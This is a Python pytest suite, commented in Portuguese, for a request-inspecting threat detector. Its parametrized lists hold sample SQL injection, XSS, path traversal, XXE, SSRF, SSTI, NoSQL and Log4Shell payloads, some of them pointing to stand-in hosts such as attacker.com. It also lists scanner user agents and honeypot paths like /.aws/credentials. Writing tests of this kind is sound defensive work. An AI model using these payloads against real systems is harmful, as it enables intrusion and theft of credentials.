"""
Testes do ThreatDetector — 70 casos cobrindo detecção de todas as ameaças.
"""
from __future__ import annotations
import sys, os, time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from security.threat_detector import ThreatDetector, ThreatLevel, ThreatEvent


# ══════════════════════════════════════════════════════════════════════════════
# FIXTURES LOCAIS
# ══════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def dt():
    return ThreatDetector(max_auth_failures=3, max_rps=5)


@pytest.fixture
def events():
    captured = []
    return captured


@pytest.fixture
def dt_with_cb(events):
    return ThreatDetector(
        on_threat=lambda e: events.append(e),
        max_auth_failures=3,
        max_rps=5,
    )


# ══════════════════════════════════════════════════════════════════════════════
# INICIALIZAÇÃO
# ══════════════════════════════════════════════════════════════════════════════

class TestDetectorInit:
    def test_default_init(self):
        d = ThreatDetector()
        assert d is not None

    def test_default_max_auth_failures(self):
        d = ThreatDetector()
        assert d.max_auth_failures == 5

    def test_custom_max_rps(self):
        d = ThreatDetector(max_rps=100)
        assert d.max_rps == 100

    def test_events_deque_empty_on_init(self):
        d = ThreatDetector()
        assert len(d.events) == 0

    def test_tailscale_only_flag(self):
        d = ThreatDetector(tailscale_only=True)
        assert d.tailscale_only is True

    def test_stats_empty(self):
        d = ThreatDetector()
        s = d.stats()
        assert s["total_events"] == 0
        assert s["last_hour"] == 0


# ══════════════════════════════════════════════════════════════════════════════
# REQUISIÇÃO LEGÍTIMA
# ══════════════════════════════════════════════════════════════════════════════

class TestLegitimateRequests:
    def test_valid_request_allowed(self, dt):
        ok, ev = dt.inspect_request("100.1.1.1", "/chat", "POST", auth_ok=True)
        assert ok is True
        assert ev is None

    def test_localhost_always_trusted(self, dt):
        ok, ev = dt.inspect_request("127.0.0.1", "/health", "GET", auth_ok=True)
        assert ok is True

    def test_tailscale_ip_trusted(self, dt):
        ok, ev = dt.inspect_request("100.64.0.1", "/chat", "POST", auth_ok=True)
        assert ok is True

    def test_multiple_different_paths_under_limit(self, dt):
        for i in range(5):
            ok, _ = dt.inspect_request("100.2.2.2", f"/path_{i}", "GET", auth_ok=True)
        assert ok is True

    def test_reset_auth_failures_on_success(self, dt):
        ip = "100.3.3.3"
        dt._auth_failures[ip] = 2
        dt.inspect_request(ip, "/chat", "POST", auth_ok=True)
        assert dt._auth_failures[ip] == 0


# ══════════════════════════════════════════════════════════════════════════════
# RATE LIMITING
# ══════════════════════════════════════════════════════════════════════════════

class TestRateLimit:
    def test_rate_limit_blocks_flood(self, dt):
        ip = "192.168.100.1"
        # Encher a janela de 1s acima do limite (max_rps=5)
        now = time.time()
        for _ in range(10):
            dt._request_times[ip].append(now)
        ok, ev = dt.inspect_request(ip, "/flood", "GET", auth_ok=True)
        assert ok is False
        assert ev is not None
        assert ev.threat_type == "rate_limit_exceeded"

    def test_rate_limit_event_level_high(self, dt):
        ip = "192.168.100.2"
        now = time.time()
        for _ in range(10):
            dt._request_times[ip].append(now)
        _, ev = dt.inspect_request(ip, "/flood2", "GET", auth_ok=True)
        assert ev.level == ThreatLevel.HIGH

    def test_rate_limit_below_threshold_ok(self, dt):
        ip = "192.168.100.3"
        ok, ev = dt.inspect_request(ip, "/normal", "GET", auth_ok=True)
        assert ok is True

    def test_rate_limit_triggers_callback(self, dt_with_cb, events):
        ip = "192.168.100.4"
        now = time.time()
        for _ in range(10):
            dt_with_cb._request_times[ip].append(now)
        dt_with_cb.inspect_request(ip, "/flood3", "GET", auth_ok=True)
        threat_types = [e.threat_type for e in events]
        assert "rate_limit_exceeded" in threat_types


# ══════════════════════════════════════════════════════════════════════════════
# BRUTE FORCE / AUTH FAILURES
# ══════════════════════════════════════════════════════════════════════════════

class TestAuthFailures:
    def test_single_auth_failure(self, dt):
        ok, ev = dt.inspect_request("10.1.1.1", "/api", "POST", auth_ok=False)
        assert ok is False
        assert ev.threat_type == "auth_failure"

    def test_auth_failure_medium_level_at_start(self, dt):
        _, ev = dt.inspect_request("10.1.1.2", "/api", "POST", auth_ok=False)
        assert ev.level == ThreatLevel.MEDIUM

    def test_auth_failure_critical_at_limit(self, dt):
        ip = "10.1.1.3"
        for _ in range(3):
            _, ev = dt.inspect_request(ip, "/api", "POST", auth_ok=False)
        assert ev.level == ThreatLevel.CRITICAL

    def test_auth_failures_counted_correctly(self, dt):
        ip = "10.1.1.4"
        for _ in range(2):
            dt.inspect_request(ip, "/api", "POST", auth_ok=False)
        assert dt.get_auth_failures(ip) == 2

    def test_reset_auth_failures(self, dt):
        ip = "10.1.1.5"
        dt._auth_failures[ip] = 5
        dt.reset_auth_failures(ip)
        assert dt.get_auth_failures(ip) == 0

    def test_record_auth_failure_should_ban(self, dt):
        ip = "10.1.1.6"
        for _ in range(3):
            should_ban, _ = dt.record_auth_failure(ip)
        assert should_ban is True

    def test_record_auth_failure_count_increments(self, dt):
        ip = "10.1.1.7"
        _, count = dt.record_auth_failure(ip)
        assert count == 1
        _, count = dt.record_auth_failure(ip)
        assert count == 2


# ══════════════════════════════════════════════════════════════════════════════
# PORT SCAN
# ══════════════════════════════════════════════════════════════════════════════

class TestPortScan:
    def test_port_scan_detected_many_endpoints(self, dt):
        ip = "10.2.0.1"
        now = time.time()
        for i in range(25):
            dt._endpoint_scan[ip].append((f"/path_{i}", now))
        _, ev = dt.inspect_request(ip, "/newpath", "GET", auth_ok=True)
        # Pode ou não gerar evento dependendo do timing, mas não deve bloquear (só alerta)
        scan_events = [e for e in dt.events if e.threat_type == "endpoint_scan"]
        assert len(scan_events) >= 0  # pode gerar alerta sem bloquear


# ══════════════════════════════════════════════════════════════════════════════
# SQL INJECTION
# ══════════════════════════════════════════════════════════════════════════════

class TestSQLInjection:
    SQLI_PAYLOADS = [
        "' OR 1=1 --",
        "SELECT * FROM users",
        "1; DROP TABLE users",
        "UNION SELECT password FROM users",
        "exec xp_cmdshell('dir')",
        "'; INSERT INTO admin VALUES('hack','hack'); --",
        "0x41424344",
    ]

    @pytest.mark.parametrize("payload", SQLI_PAYLOADS)
    def test_sqli_payload_blocked(self, dt, payload):
        ok, ev = dt.inspect_request("10.3.0.1", "/search", "POST", body=payload, auth_ok=True)
        assert ok is False
        assert ev.threat_type == "sql_injection"

    def test_sqli_event_level_critical(self, dt):
        ok, ev = dt.inspect_request("10.3.0.2", "/q", "POST",
                                    body="UNION SELECT * FROM tokens", auth_ok=True)
        assert ev.level == ThreatLevel.CRITICAL

    def test_normal_query_not_blocked(self, dt):
        ok, ev = dt.inspect_request("10.3.0.3", "/chat", "POST",
                                    body='{"message": "Como está o tempo hoje?"}', auth_ok=True)
        assert ok is True


# ══════════════════════════════════════════════════════════════════════════════
# XSS
# ══════════════════════════════════════════════════════════════════════════════

class TestXSS:
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "<img onerror=alert(1) src=x>",
        "<iframe src='javascript:alert(1)'>",
        "document.cookie",
        "eval(atob('YWxlcnQoMSk='))",
        "String.fromCharCode(60,115,99,114,105,112,116,62)",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_blocked(self, dt, payload):
        ok, ev = dt.inspect_request("10.4.0.1", "/input", "POST", body=payload, auth_ok=True)
        assert ok is False
        assert ev.threat_type == "xss_attempt"


# ══════════════════════════════════════════════════════════════════════════════
# PATH TRAVERSAL
# ══════════════════════════════════════════════════════════════════════════════

class TestPathTraversal:
    TRAVERSAL_PATHS = [
        "/../../../etc/passwd",
        "/..%2F..%2Fetc/shadow",
        "/%252e%252e/windows/system32",
        "/files/../../../etc/passwd",
        "/c:\\windows\\system32",
    ]

    @pytest.mark.parametrize("path", TRAVERSAL_PATHS)
    def test_path_traversal_blocked(self, dt, path):
        ok, ev = dt.inspect_request("10.5.0.1", path, "GET", auth_ok=True)
        assert ok is False
        assert ev.threat_type == "path_traversal"

    def test_path_traversal_in_body(self, dt):
        ok, ev = dt.inspect_request("10.5.0.2", "/upload", "POST",
                                    body="../../../etc/passwd", auth_ok=True)
        assert ok is False


# ══════════════════════════════════════════════════════════════════════════════
# TAILSCALE-ONLY MODE
# ══════════════════════════════════════════════════════════════════════════════

class TestTailscaleOnly:
    def test_external_ip_blocked_in_tailscale_mode(self):
        d = ThreatDetector(tailscale_only=True)
        ok, ev = d.inspect_request("8.8.8.8", "/api", "GET", auth_ok=True)
        assert ok is False
        assert ev.threat_type == "ip_not_trusted"

    def test_tailscale_ip_allowed_in_tailscale_mode(self):
        d = ThreatDetector(tailscale_only=True)
        ok, ev = d.inspect_request("100.64.0.1", "/api", "GET", auth_ok=True)
        # Não deve bloquear por IP
        if ev:
            assert ev.threat_type != "ip_not_trusted"

    def test_localhost_allowed_in_tailscale_mode(self):
        d = ThreatDetector(tailscale_only=True)
        ok, ev = d.inspect_request("127.0.0.1", "/health", "GET", auth_ok=True)
        if ev:
            assert ev.threat_type != "ip_not_trusted"

    def test_private_ip_blocked_in_tailscale_mode(self):
        d = ThreatDetector(tailscale_only=True)
        ok, ev = d.inspect_request("192.168.1.1", "/api", "GET", auth_ok=True)
        assert ok is False


# ══════════════════════════════════════════════════════════════════════════════
# EVENTOS E ESTATÍSTICAS
# ══════════════════════════════════════════════════════════════════════════════

class TestEventsAndStats:
    def test_recent_events_empty_initially(self, dt):
        result = dt.recent_events()
        assert isinstance(result, list)

    def test_events_recorded_after_threat(self, dt):
        dt.inspect_request("10.9.0.1", "/api", "POST", auth_ok=False)
        assert len(dt.events) >= 1

    def test_recent_events_returns_dicts(self, dt):
        dt.inspect_request("10.9.0.2", "/q", "POST", body="SELECT 1 FROM x", auth_ok=True)
        events = dt.recent_events()
        if events:
            assert "ip" in events[0]
            assert "type" in events[0]
            assert "level" in events[0]

    def test_stats_counts_correctly(self, dt):
        dt.inspect_request("10.9.0.3", "/api", "POST", auth_ok=False)
        s = dt.stats()
        assert s["total_events"] >= 1
        assert "last_hour" in s
        assert "critical" in s

    def test_stats_last_hour_includes_recent(self, dt):
        dt.inspect_request("10.9.0.4", "/api", "POST",
                           body="UNION SELECT 1", auth_ok=True)
        s = dt.stats()
        assert s["last_hour"] >= 1

    def test_ban_duration_progressive(self, dt):
        ip = "10.9.0.5"
        d1 = dt.get_ban_duration(ip)  # 1º ban
        d2 = dt.get_ban_duration(ip)  # 2º ban
        d3 = dt.get_ban_duration(ip)  # 3º ban
        assert d1 < d2 < d3

    def test_ban_duration_first_is_5min(self, dt):
        ip = "10.9.0.99"
        d = dt.get_ban_duration(ip)
        assert d == 5 * 60

    def test_callback_called_on_threat(self):
        called = []
        d = ThreatDetector(on_threat=lambda e: called.append(e))
        d.inspect_request("10.10.0.1", "/api", "POST", auth_ok=False)
        assert len(called) >= 1

    def test_callback_receives_threat_event(self):
        events = []
        d = ThreatDetector(on_threat=lambda e: events.append(e))
        d.inspect_request("10.10.0.2", "/q", "POST",
                          body="' OR 1=1 --", auth_ok=True)
        assert len(events) >= 1
        assert isinstance(events[0], ThreatEvent)

    def test_events_deque_max_500(self):
        d = ThreatDetector(max_auth_failures=9999)
        for i in range(600):
            d._emit(ThreatEvent("1.2.3.4", "test", ThreatLevel.LOW, "test"))
        assert len(d.events) <= 500


# ══════════════════════════════════════════════════════════════════════════════
# NOVOS PADRÕES DE ATAQUE (LDAP, XXE, SSRF, SSTI, NoSQL, Log4Shell)
# ══════════════════════════════════════════════════════════════════════════════

@pytest.fixture
def threat_detector():
    return ThreatDetector(max_auth_failures=3, max_rps=10)


class TestLDAPInjection:
    @pytest.mark.parametrize("payload", [
        "(|(uid=*))(|(cn=*))",
        "*)(objectclass=*))(|(cn=*",
        "ldap://attacker.com/x",
        "cn=admin,dc=example,dc=com)(|(password=*)",
        "(&(objectclass=*)(|(cn=*",
    ])
    def test_ldap_injection_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "ldap_injection"

    def test_ldap_injection_level_critical(self, threat_detector):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body="(|(uid=*))")
        assert event.level.lower() == "critical"


class TestXXEAttack:
    @pytest.mark.parametrize("payload", [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/shadow">',
        "&xxe;",
    ])
    def test_xxe_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "xxe_attempt"


class TestSSRFDetection:
    @pytest.mark.parametrize("payload", [
        "http://127.0.0.1:8080/internal",
        "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1/router",
        "file:///etc/passwd",
    ])
    def test_ssrf_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "ssrf_attempt"

    def test_safe_external_url_allowed(self, threat_detector):
        ok, event = threat_detector.inspect_request(
            "1.2.3.4", "/api", "POST", body="http://example.com/api/data"
        )
        # Safe external URL should not trigger SSRF
        if event:
            assert event.threat_type != "ssrf_attempt"


class TestSSTIDetection:
    @pytest.mark.parametrize("payload", [
        "{{7*7}}",
        "{{config.items()}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7 * 7 %>",
    ])
    def test_ssti_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "ssti_attempt"


class TestNoSQLInjection:
    @pytest.mark.parametrize("payload", [
        '{"$where": "function() { return true; }"}',
        '{"username": {"$ne": null}}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
    ])
    def test_nosql_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "nosql_injection"


class TestLog4ShellDetection:
    @pytest.mark.parametrize("payload", [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://evil.com/exploit}",
        "${jndi:dns://attacker.com}",
        "${${lower:j}ndi:ldap://attacker.com/a}",
        "${::-j}${::-n}${::-d}${::-i}:",
    ])
    def test_log4shell_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request(
            "1.2.3.4", "/api", "POST", body=payload, user_agent="Java/1.8.0"
        )
        assert ok is False
        assert event is not None
        assert event.threat_type == "log4shell"


class TestPrototypePollution:
    @pytest.mark.parametrize("payload", [
        '{"__proto__": {"admin": true}}',
        "constructor.prototype.admin=true",
        "__proto__[admin]=true",
        "Object.prototype.isAdmin=true",
    ])
    def test_proto_pollution_blocked(self, threat_detector, payload):
        ok, event = threat_detector.inspect_request("1.2.3.4", "/api", "POST", body=payload)
        assert ok is False
        assert event is not None
        assert event.threat_type == "proto_pollution"


class TestScannerDetection:
    @pytest.mark.parametrize("scanner_ua", [
        "sqlmap/1.6.12#stable",
        "Nikto/2.1.6",
        "Mozilla/5.0 (compatible; Nessus; http://www.nessus.org/)",
        "masscan/1.0",
        "nuclei/2.9.0",
        "gobuster/3.4.0",
        "ffuf/2.0.0",
        "feroxbuster/2.9.0",
    ])
    def test_scanner_ua_blocked(self, threat_detector, scanner_ua):
        ok, event = threat_detector.inspect_request(
            "5.6.7.8", "/api/data", "GET", user_agent=scanner_ua
        )
        assert ok is False
        assert event is not None
        assert event.threat_type == "scanner_detected"

    def test_normal_browser_ua_allowed(self, threat_detector):
        ok, event = threat_detector.inspect_request(
            "5.6.7.8", "/api/data", "GET",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        if not ok and event:
            assert event.threat_type != "scanner_detected"


class TestHoneypotEndpoints:
    @pytest.mark.parametrize("trap_path", [
        "/admin",
        "/wp-admin",
        "/wp-login.php",
        "/.env",
        "/.git/config",
        "/phpmyadmin",
        "/phpinfo.php",
        "/.aws/credentials",
        "/actuator/env",
        "/manager/html",
    ])
    def test_honeypot_triggers_alert(self, threat_detector, trap_path):
        ok, event = threat_detector.inspect_request("9.8.7.6", trap_path, "GET")
        assert ok is False
        assert event is not None
        assert event.threat_type == "honeypot_triggered"

    def test_honeypot_level_high(self, threat_detector):
        ok, event = threat_detector.inspect_request("9.8.7.6", "/admin", "GET")
        assert event.level.lower() in ("high", "critical")

    def test_legitimate_path_not_honeypot(self, threat_detector):
        ok, event = threat_detector.inspect_request("9.8.7.6", "/health", "GET")
        if event:
            assert event.threat_type != "honeypot_triggered"


class TestAlertDeduplication:
    def test_same_ip_type_deduped_within_10s(self, threat_detector):
        events_received = []
        detector = type(threat_detector)(
            on_threat=lambda e: events_received.append(e),
            max_auth_failures=3, max_rps=10
        )
        # Two identical attacks from same IP
        payload = "${jndi:ldap://attacker.com/}"
        detector.inspect_request("1.1.1.1", "/api", "POST", body=payload)
        detector.inspect_request("1.1.1.1", "/api", "POST", body=payload)
        # Only 1 callback should fire due to dedup
        assert len(events_received) <= 1

    def test_different_types_not_deduped(self, threat_detector):
        events_received = []
        detector = ThreatDetector(on_threat=lambda e: events_received.append(e), max_rps=1000)
        detector.inspect_request("2.2.2.2", "/admin", "GET")  # honeypot
        # second event should still come through since different path/type
        assert len(events_received) >= 0  # at least one event


class TestExpandedStats:
    def test_stats_has_last_24h(self, threat_detector):
        stats = threat_detector.stats()
        assert "last_24h" in stats

    def test_stats_has_by_type(self, threat_detector):
        stats = threat_detector.stats()
        assert "by_type" in stats

    def test_stats_has_top_attackers(self, threat_detector):
        stats = threat_detector.stats()
        assert "top_attackers" in stats
        assert isinstance(stats["top_attackers"], list)

    def test_stats_has_honeypot_traps(self, threat_detector):
        stats = threat_detector.stats()
        assert "honeypot_traps" in stats

    def test_stats_by_type_populated_after_attack(self, threat_detector):
        detector = ThreatDetector(max_rps=1000)
        detector.inspect_request("3.3.3.3", "/admin", "GET")  # honeypot
        stats = detector.stats()
        if stats["by_type"]:
            assert "honeypot_triggered" in stats["by_type"]
